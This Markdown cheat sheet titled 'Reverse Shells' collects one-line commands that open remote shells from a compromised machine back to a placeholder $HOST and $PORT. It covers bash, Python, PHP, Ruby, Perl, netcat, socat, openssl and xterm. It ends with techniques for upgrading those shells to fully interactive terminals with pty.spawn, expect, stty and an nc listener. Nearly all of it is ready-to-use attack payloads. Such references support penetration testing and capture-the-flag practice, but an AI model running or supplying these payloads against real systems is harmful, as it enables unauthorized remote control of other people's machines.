---
title: Reverse Shells
tags:
  - Cheatsheet
---

Examples generally use `$HOST` and `$PORT` for the target host and port for the
shell callback.

## Bash ##

Bash **only** reverse shells generally require that `/dev/tcp` is enabled in
bash at build-time.

```
bash -i >& /dev/tcp/$HOST/$PORT 0>&1
```

Use redirection through a temporary FD (in this case, 42).

```
0<&42;exec 42<>/dev/tcp/$HOST/$PORT; sh <&42 >&42 2>&42
```

## Python ##

```
python -c 'import socket as so,subprocess,os;s=so.socket(so.AF_INET,so.SOCK_STREAM);s.connect(("$HOST",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP ##

```
php -r '$sock=fsockopen("$HOST",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Ruby ##

```
ruby -rsocket -e'f=TCPSocket.open("$HOST",$PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Perl ##

```
perl -e 'use Socket;$i="$HOST";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Common Utilities ##

Sometimes you can just use a utility available on the system.

### Netcat (Traditional) ###

```
nc -e /bin/sh $HOST $PORT
```

### Socat ###

[Socat is also a great handler for the shells](https://systemoverlord.com/2018/01/20/socat-as-a-handler-for-multiple-reverse-shells.html)

```
socat TCP:$HOST:$PORT exec:/bin/bash,pty,stderr,setsid
```

You can even get a full pty if you use socat as your listener.

Listener:

```
socat file:`tty`,raw,echo=0 tcp-listen:$PORT
```

Victim:

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$HOST:$PORT
```

### Netcat (OpenBSD) ###

OpenBSD netcat removed the `-e` flag "for security."  All of these mechanisms
will also work on traditional netcat.

```
rm /tmp/f;mkfifo /tmp/f;/bin/sh -i 2>&1 </tmp/f|nc $HOST $PORT >/tmp/f
```

### OpenSSL ###

For your encrypted reverse shells!  Depends on the openssl command line binary.
It's a lot like OpenBSD netcat.

```
rm /tmp/f;mkfifo /tmp/f;/bin/sh -i 2>&1 </tmp/f|openssl s_client -connect $HOST:$PORT >/tmp/f
```

### Xterm ###

This is very different.  Instead of forwarding a shell, forward a whole terminal
emulator!

Attacker host:

```
xnest :1
xhost +targetip
```

On the target:

```
xterm -display $HOST:1
```

## Reverse Shell Tips ##

So a basic reverse shell pretty much sucks.

- Hitting `^C` is a terrible experience.  (Usually kills the listener, not what
  you ran on the server.)
- No history, job control, etc.
- Can't use most editors.

### Getting a pty (python) ###

Probably the most commonly known technique:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Getting a pty (expect) ###

Expect isn't as commonly installed as python, but this is a good choice for some
circumstances.

```
cat >/tmp/e.exp <<EOF
#!/usr/bin/expect
spawn bash
interact
EOF
expect /tmp/e.exp
```

### Upgrading via python + stty ###

[Inspiration](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

Before connection:

``` bash
echo 'After connection, please run: '
echo python -c 'import pty; pty.spawn("/bin/bash")'
echo export SHELL=bash
echo export TERM=$TERM
echo stty rows $(stty -a | tr ';' '\n' | awk '/^ rows/{print $2}') columns $(stty -a | tr ';' '\n' | awk '/^ columns/{print $2}')
stty raw -echo  # Note, you will lose echo here.
nc -lvp $PORT
```

After connecting, run the commands provided by the original script, and you
should be good to go.
